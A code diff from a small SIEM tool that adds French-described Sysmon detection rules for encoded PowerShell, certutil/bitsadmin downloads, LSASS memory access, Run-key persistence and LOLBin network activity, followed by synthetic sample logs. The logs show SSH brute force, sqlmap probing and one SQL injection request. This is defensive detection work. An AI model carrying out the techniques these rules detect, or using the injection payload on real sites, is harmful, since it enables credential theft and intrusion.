+    "description": "PowerShell reçoit son script en Base64 (-EncodedCommand ou l'une de ses abréviations : -enc, -ec, -e…), suivi d'un bloc encodé (Sysmon 1). Les administrateurs l'utilisent rarement ; les chargeurs malveillants, très souvent, pour masquer la commande aux regards et aux filtres simples.\n",
+    "selection": {
+      "event_type": "process_creation",
+      "process": {
+        "endswith": [
+          "\\powershell.exe",
+          "\\pwsh.exe"
+        ]
+      },
+      "command_line": {
+        "regex": "\\s[-/]e(?:c|n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?\\s+[A-Za-z0-9+/=]{20,}"
+      }
+    },
+    "group_by": [
+      "host",
+      "user"
+    ]
+  },
+  {
+    "id": "SYSMON_LOLBIN_DOWNLOAD",
+    "title": "Téléchargement par un binaire Windows détourné",
+    "type": "match",
+    "level": "high",
+    "attack": "T1105",
+    "tactic": "Command and Control",
+    "description": "certutil (-urlcache) ou bitsadmin (/transfer) sert à télécharger un fichier (Sysmon 1). Ces outils sont signés par Microsoft et présents partout, d'où leur usage pour récupérer une charge sans apporter son propre outil (« living off the land »). Le simple calcul d'empreinte (certutil -hashfile) ne déclenche rien.\n",
+    "selection": {
+      "event_type": "process_creation",
+      "command_line": {
+        "regex": "(?:certutil(?:\\.exe)?\\s.*[-/](?:urlcache|verifyctl)|bitsadmin(?:\\.exe)?\\s.*/transfer)"
+      }
+    },
+    "group_by": [
+      "host",
+      "user"
+    ]
+  },
+  {
+    "id": "SYSMON_LSASS_ACCESS",
+    "title": "Accès mémoire suspect au processus LSASS",
+    "type": "match",
+    "level": "critical",
+    "attack": "T1003.001",
+    "tactic": "Credential Access",
+    "description": "Un processus ouvre lsass.exe avec des droits de lecture mémoire (Sysmon 10, GrantedAccess 0x1010, 0x1410, 0x1fffff…). LSASS garde les secrets des sessions ouvertes : c'est ce que fait un outil de vol d'identifiants (type Mimikatz) ou un dump mémoire. L'antivirus et les processus système qui y accèdent légitimement sont écartés par le filtre.\n",
+    "selection": {
+      "event_type": "process_access",
+      "target": {
+        "endswith": "\\lsass.exe"
+      },
+      "granted_access": {
+        "in": [
+          "0x1010",
+          "0x1410",
+          "0x1438",
+          "0x143a",
+          "0x1f0fff",
+          "0x1f1fff",
+          "0x1f3fff",
+          "0x1fffff"
+        ]
+      }
+    },
+    "filter": {
+      "process": {
+        "endswith": [
+          "\\MsMpEng.exe",
+          "\\MsSense.exe",
+          "\\wininit.exe",
+          "\\csrss.exe"
+        ]
+      }
+    },
+    "group_by": [
+      "host",
+      "process"
+    ]
+  },
+  {
+    "id": "SYSMON_RUN_KEY",
+    "title": "Persistance par une clé de registre Run",
+    "type": "match",
+    "level": "medium",
+    "attack": "T1547.001",
+    "tactic": "Persistence",
+    "description": "Une valeur est écrite sous une clé Run ou RunOnce (Sysmon 13) : le programme indiqué se relancera à chaque ouverture de session. C'est la persistance la plus courante sous Windows ; un installeur légitime le fait aussi, d'où une sévérité moyenne et le contrôle de la valeur écrite.\n",
+    "selection": {
+      "event_type": "registry_set",
+      "target": {
+        "contains": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      }
+    },
+    "group_by": [
+      "host",
+      "process"
+    ]
+  },
+  {
+    "id": "SYSMON_LOLBIN_NETWORK",
+    "title": "Connexion réseau d'un binaire système détourné",
+    "type": "match",
+    "level": "high",
+    "attack": "T1218",
+    "tactic": "Defense Evasion",
+    "description": "rundll32, regsvr32 ou mshta ouvre une connexion réseau (Sysmon 3). Ces binaires servent à exécuter du code sous couvert d'un programme signé ; qu'ils parlent au réseau évoque une charge chargée en mémoire qui contacte son serveur de commande (C2). Des connexions répétées vers la même adresse ressemblent à une balise.\n",
+    "selection": {
+      "event_type": "network_connection",
+      "process": {
+        "endswith": [
+          "\\rundll32.exe",
+          "\\regsvr32.exe",
+          "\\mshta.exe"
+        ]
+      }
+    },
+    "group_by": [
+      "host",
+      "process",
+      "dest_ip"
+    ]
   }
 ];
   if (typeof module !== 'undefined' && module.exports) module.exports = root.MINISIEM_RULES;
@@ -723,7 +983,7 @@
 <script>
 /* Généré par build_web_rules.py — logs d'exemple synthétiques. */
 (function (root) {
-  root.MINISIEM_SAMPLES = {"auth": "Nov  8 09:01:38 web01 sshd[5179]: Accepted password for carol from 192.168.1.20 port 43863 ssh2\nNov  8 09:05:58 web01 sshd[7219]: Accepted password for bob from 10.0.0.5 port 46879 ssh2\nNov  8 09:06:03 web01 sudo[1464]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:09:47 web01 sshd[1034]: Accepted password for bob from 10.0.0.5 port 54594 ssh2\nNov  8 09:09:52 web01 sudo[4748]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:15:19 web01 sshd[1501]: Accepted password for alice from 192.168.1.21 port 40731 ssh2\nNov  8 09:15:24 web01 sudo[9870]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:15:53 web01 sshd[4548]: Accepted password for bob from 10.0.0.5 port 53831 ssh2\nNov  8 09:20:53 web01 sshd[9123]: Accepted password for alice from 192.168.1.21 port 58116 ssh2\nNov  8 09:20:58 web01 sudo[4782]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:27:09 web01 sshd[5747]: Accepted password for alice from 192.168.1.21 port 40704 ssh2\nNov  8 09:32:23 web01 sshd[4045]: Accepted password for carol from 192.168.1.20 port 49712 ssh2\nNov  8 09:32:28 web01 sudo[6450]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:35:08 web01 sshd[9259]: Failed password for invalid user test from 203.0.113.66 port 56377 ssh2\nNov  8 09:35:10 web01 sshd[7591]: Failed password for invalid user test from 203.0.113.66 port 49219 ssh2\nNov  8 09:35:12 web01 sshd[4290]: Failed password for admin from 203.0.113.66 port 50739 ssh2\nNov  8 09:35:16 web01 sshd[8032]: Failed password for invalid user test from 203.0.113.66 port 46980 ssh2\nNov  8 09:35:22 web01 sshd[7213]: Failed password for root from 203.0.113.66 port 57944 ssh2\nNov  8 09:35:29 web01 sshd[8938]: Failed password for ubuntu from 203.0.113.66 port 57449 ssh2\nNov  8 09:35:34 web01 sshd[1661]: Failed password for root from 203.0.113.66 port 42774 ssh2\nNov  8 09:35:38 web01 sshd[3728]: Failed password for admin from 203.0.113.66 port 57636 ssh2\nNov  8 09:35:43 web01 sshd[6443]: Failed password for invalid user test from 203.0.113.66 port 59667 ssh2\nNov  8 09:35:53 web01 sshd[7031]: Failed password for invalid user test from 203.0.113.66 port 51103 ssh2\nNov  8 09:36:00 web01 sshd[5771]: Failed password for root from 203.0.113.66 port 47706 ssh2\nNov  8 09:36:09 web01 sshd[2708]: Failed password for admin from 203.0.113.66 port 50509 ssh2\nNov  8 09:36:11 web01 sshd[2199]: Failed password for invalid user oracle from 203.0.113.66 port 52459 ssh2\nNov  8 09:36:15 web01 sshd[6585]: Failed password for admin from 203.0.113.66 port 43758 ssh2\nNov  8 09:36:23 web01 sshd[4665]: Failed password for root from 203.0.113.66 port 58545 ssh2\nNov  8 09:36:26 web01 sshd[6978]: Failed password for invalid user test from 203.0.113.66 port 49684 ssh2\nNov  8 09:36:36 web01 sshd[8500]: Failed password for root from 203.0.113.66 port 49082 ssh2\nNov  8 09:36:39 web01 sshd[5845]: Failed password for root from 203.0.113.66 port 40405 ssh2\nNov  8 09:36:41 web01 sshd[7775]: Failed password for root from 203.0.113.66 port 43771 ssh2\nNov  8 09:36:43 web01 sshd[4926]: Failed password for admin from 203.0.113.66 port 59228 ssh2\nNov  8 09:36:51 web01 sshd[2893]: Failed password for admin from 203.0.113.66 port 54775 ssh2\nNov  8 09:36:55 web01 sshd[3604]: Failed password for admin from 203.0.113.66 port 43369 ssh2\nNov  8 09:37:03 web01 sshd[9895]: Failed password for invalid user oracle from 203.0.113.66 port 49634 ssh2\nNov  8 09:37:13 web01 sshd[8815]: Failed password for invalid user test from 203.0.113.66 port 50304 ssh2\nNov  8 09:37:16 web01 sshd[6200]: Failed password for admin from 203.0.113.66 port 41298 ssh2\nNov  8 09:39:02 web01 sshd[7915]: Accepted password for carol from 10.0.0.5 port 56636 ssh2\nNov  8 09:45:15 web01 sshd[5655]: Accepted password for alice from 192.168.1.21 port 59253 ssh2\nNov  8 09:50:00 web01 sshd[1565]: Accepted password for carol from 192.168.1.21 port 55736 ssh2\nNov  8 09:50:03 web01 sshd[1172]: Failed password for admin from 198.51.100.23 port 49684 ssh2\nNov  8 09:50:05 web01 sudo[7623]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:50:15 web01 sshd[6246]: Failed password for admin from 198.51.100.23 port 54740 ssh2\nNov  8 09:50:24 web01 sshd[6132]: Failed password for admin from 198.51.100.23 port 53059 ssh2\nNov  8 09:50:28 web01 sshd[2051]: Failed password for admin from 198.51.100.23 port 50398 ssh2\nNov  8 09:50:40 web01 sshd[8468]: Failed password for admin from 198.51.100.23 port 43649 ssh2\nNov  8 09:50:47 web01 sshd[4525]: Failed password for admin from 198.51.100.23 port 57790 ssh2\nNov  8 09:50:57 web01 sshd[6829]: Failed password for admin from 198.51.100.23 port 48489 ssh2\nNov  8 09:51:02 web01 sshd[9873]: Failed password for admin from 198.51.100.23 port 46810 ssh2\nNov  8 09:51:11 web01 sshd[6035]: Accepted password for admin from 198.51.100.23 port 46527 ssh2\nNov  8 09:54:02 web01 sshd[7014]: Accepted password for carol from 192.168.1.20 port 57983 ssh2\nNov  8 09:58:00 web01 sudo[4812]:  www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\nNov  8 10:00:17 web01 sshd[2416]: Accepted password for carol from 192.168.1.21 port 54383 ssh2\nNov  8 10:01:42 web01 sshd[7443]: Accepted password for alice from 10.0.0.5 port 52141 ssh2\nNov  8 10:02:27 web01 sshd[6054]: Accepted password for bob from 192.168.1.20 port 59437 ssh2\nNov  8 10:02:51 web01 sshd[6905]: Failed password for root from 203.0.113.200 port 42666 ssh2\nNov  8 10:03:46 web01 sshd[2464]: Failed password for root from 203.0.113.200 port 54676 ssh2\nNov  8 10:04:17 web01 sshd[6552]: Failed password for root from 203.0.113.200 port 47452 ssh2\nNov  8 10:08:28 web01 sshd[9228]: Accepted password for alice from 192.168.1.20 port 47436 ssh2\nNov  8 10:10:40 web01 sshd[4803]: Accepted password for carol from 10.0.0.5 port 53253 ssh2\nNov  8 10:16:05 web01 sshd[5411]: Accepted password for bob from 192.168.1.21 port 57956 ssh2\nNov  8 10:16:37 web01 sshd[9396]: Accepted password for bob from 10.0.0.5 port 44235 ssh2\nNov  8 10:21:54 web01 sshd[1919]: Accepted password for alice from 192.168.1.21 port 55764 ssh2\nNov  8 10:27:15 web01 sshd[9269]: Accepted password for carol from 192.168.1.20 port 53546 ssh2\nNov  8 10:30:47 web01 sshd[1025]: Accepted password for bob from 192.168.1.21 port 57644 ssh2\nNov  8 10:36:30 web01 sshd[1458]: Accepted password for bob from 192.168.1.21 port 47523 ssh2\nNov  8 10:41:41 web01 sshd[2500]: Accepted password for carol from 192.168.1.20 port 58056 ssh2\nNov  8 10:44:21 web01 sshd[2154]: Accepted password for alice from 10.0.0.5 port 42727 ssh2\nNov  8 10:48:42 web01 sshd[5088]: Accepted password for alice from 192.168.1.21 port 48802 ssh2\nNov  8 10:48:47 web01 sudo[4024]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 10:52:08 web01 sshd[3743]: Accepted password for bob from 192.168.1.20 port 45230 ssh2\nNov  8 10:52:13 web01 sudo[3754]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 10:58:14 web01 sshd[5824]: Accepted password for bob from 10.0.0.5 port 54899 ssh2\nNov  8 11:02:58 web01 sshd[1387]: Accepted password for bob from 192.168.1.20 port 50223 ssh2\nNov  8 11:07:03 web01 sshd[2781]: Accepted password for alice from 192.168.1.21 port 48305 ssh2\nNov  8 11:11:54 web01 sshd[8072]: Accepted password for alice from 10.0.0.5 port 40682 ssh2\nNov  8 11:11:59 web01 sudo[7509]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:13:38 web01 sshd[3625]: Accepted password for alice from 10.0.0.5 port 54603 ssh2\nNov  8 11:19:55 web01 sshd[4614]: Accepted password for bob from 10.0.0.5 port 56927 ssh2\nNov  8 11:24:53 web01 sshd[7470]: Accepted password for carol from 192.168.1.20 port 58869 ssh2\nNov  8 11:31:00 web01 sshd[1963]: Accepted password for carol from 192.168.1.21 port 49784 ssh2\nNov  8 11:31:05 web01 sudo[4475]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:31:54 web01 sshd[2252]: Accepted password for bob from 192.168.1.20 port 50169 ssh2\nNov  8 11:34:56 web01 sshd[7818]: Accepted password for carol from 192.168.1.20 port 58511 ssh2\nNov  8 11:35:01 web01 sudo[1138]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:40:13 web01 sshd[4565]: Accepted password for alice from 10.0.0.5 port 58686 ssh2\nNov  8 11:46:43 web01 sshd[1613]: Accepted password for carol from 10.0.0.5 port 52385 ssh2\nNov  8 11:46:48 web01 sudo[2622]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:48:58 web01 sshd[8093]: Accepted password for carol from 10.0.0.5 port 59379 ssh2\nNov  8 11:49:03 web01 sudo[2710]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\n", "web": "192.168.1.21 - - [08/Nov/2026:09:03:39 +0100] \"GET / HTTP/1.1\" 200 1540 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:05:34 +0100] \"GET /css/site.css HTTP/1.1\" 200 3859 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:08:29 +0100] \"GET /about HTTP/1.1\" 200 613 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:13:27 +0100] \"GET /css/site.css HTTP/1.1\" 200 3507 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:14:34 +0100] \"GET /index.html HTTP/1.1\" 200 283 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:16:58 +0100] \"GET / HTTP/1.1\" 200 1297 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:17:54 +0100] \"GET / HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:18:19 +0100] \"GET /about HTTP/1.1\" 200 2220 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:22:39 +0100] \"GET / HTTP/1.1\" 200 2253 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:25:46 +0100] \"GET /css/site.css HTTP/1.1\" 200 2924 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:27:34 +0100] \"GET /index.html HTTP/1.1\" 200 779 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:30:37 +0100] \"GET / HTTP/1.1\" 200 3105 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:35:20 +0100] \"GET /about HTTP/1.1\" 200 717 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:37:25 +0100] \"GET /css/site.css HTTP/1.1\" 200 3929 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:38:01 +0100] \"GET /css/site.css HTTP/1.1\" 200 3492 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n203.0.113.9 - - [08/Nov/2026:09:40:02 +0100] \"GET /server-status?id=0 HTTP/1.1\" 404 3922 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:04 +0100] \"GET /phpmyadmin/?id=1 HTTP/1.1\" 404 2660 \"-\" \"sqlmap/1.7.2#dev\"\n192.168.1.20 - - [08/Nov/2026:09:40:06 +0100] \"GET /about HTTP/1.1\" 200 1972 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n203.0.113.9 - - [08/Nov/2026:09:40:07 +0100] \"GET /config.php.bak HTTP/1.1\" 404 2905 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:09 +0100] \"GET /.git/config?id=3 HTTP/1.1\" 404 3270 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:12 +0100] \"GET /.env HTTP/1.1\" 404 2364 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:14 +0100] \"GET /api/v1/users?id=5 HTTP/1.1\" 404 2770 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:17 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 1046 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:18 +0100] \"GET /.git/config?id=7 HTTP/1.1\" 404 1021 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:20 +0100] \"GET /.git/config HTTP/1.1\" 404 1227 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:23 +0100] \"GET /server-status HTTP/1.1\" 404 3512 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:24 +0100] \"GET /.aws/credentials HTTP/1.1\" 404 1920 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:25 +0100] \"GET /xmlrpc.php?id=11 HTTP/1.1\" 404 3800 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:27 +0100] \"GET /phpmyadmin/?id=12 HTTP/1.1\" 404 642 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:28 +0100] \"GET /wp-admin/ HTTP/1.1\" 404 254 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:31 +0100] \"GET /.git/config HTTP/1.1\" 404 3317 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:34 +0100] \"GET /login.php?id=15 HTTP/1.1\" 404 2249 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:36 +0100] \"GET /api/v1/users HTTP/1.1\" 404 1990 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:39 +0100] \"GET /login.php HTTP/1.1\" 404 2364 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:41 +0100] \"GET /.env?id=18 HTTP/1.1\" 404 3140 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:43 +0100] \"GET /backup.zip HTTP/1.1\" 404 1835 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:45 +0100] \"GET /xmlrpc.php HTTP/1.1\" 404 2540 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:47 +0100] \"GET /wp-admin/ HTTP/1.1\" 404 1746 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:49 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 1337 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:52 +0100] \"GET /api/v1/users HTTP/1.1\" 404 3225 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:55 +0100] \"GET /.aws/credentials?id=24 HTTP/1.1\" 404 3981 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:57 +0100] \"GET /api/v1/users HTTP/1.1\" 404 1875 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:00 +0100] \"GET /shell.php HTTP/1.1\" 404 1450 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:03 +0100] \"GET /admin HTTP/1.1\" 404 2939 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:06 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 214 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:09 +0100] \"GET /config.php.bak HTTP/1.1\" 404 1859 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:13 +0100] \"GET /product.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 1576 \"-\" \"sqlmap/1.7.2#dev\"\n192.168.1.20 - - [08/Nov/2026:09:45:01 +0100] \"GET / HTTP/1.1\" 200 3127 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:47:27 +0100] \"GET / HTTP/1.1\" 200 2993 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:51:35 +0100] \"GET /css/site.css HTTP/1.1\" 200 1224 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:56:32 +0100] \"GET /css/site.css HTTP/1.1\" 200 2056 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:56:57 +0100] \"GET /about HTTP/1.1\" 200 902 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:59:29 +0100] \"GET / HTTP/1.1\" 200 3448 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:03:22 +0100] \"GET / HTTP/1.1\" 200 455 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:06:43 +0100] \"GET /index.html HTTP/1.1\" 200 2631 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:08:07 +0100] \"GET /about HTTP/1.1\" 200 3595 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:10:10:48 +0100] \"GET /css/site.css HTTP/1.1\" 200 1842 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:12:36 +0100] \"GET / HTTP/1.1\" 200 1156 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:17:04 +0100] \"GET /index.html HTTP/1.1\" 200 2365 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:20:06 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3970 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:24:10 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3195 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:26:25 +0100] \"GET /about HTTP/1.1\" 200 2227 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:30:50 +0100] \"GET /img/logo.png HTTP/1.1\" 200 1888 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:34:02 +0100] \"GET /css/site.css HTTP/1.1\" 200 3914 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:36:42 +0100] \"GET /index.html HTTP/1.1\" 200 397 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:37:38 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3793 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:41:06 +0100] \"GET /css/site.css HTTP/1.1\" 200 3337 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:10:43:10 +0100] \"GET /about HTTP/1.1\" 200 3036 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:46:03 +0100] \"GET /about HTTP/1.1\" 200 876 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:50:20 +0100] \"GET / HTTP/1.1\" 200 3707 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:51:43 +0100] \"GET /css/site.css HTTP/1.1\" 200 2539 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:55:16 +0100] \"GET /index.html HTTP/1.1\" 200 1226 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:59:14 +0100] \"GET /css/site.css HTTP/1.1\" 200 3147 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:00:00 +0100] \"GET /img/logo.png HTTP/1.1\" 200 1812 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:03:18 +0100] \"GET /css/site.css HTTP/1.1\" 200 3663 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:11:05:02 +0100] \"GET /img/logo.png HTTP/1.1\" 200 366 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:11:09:50 +0100] \"GET /about HTTP/1.1\" 200 2774 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:11:01 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3939 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:11:12:03 +0100] \"GET /css/site.css HTTP/1.1\" 200 3648 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 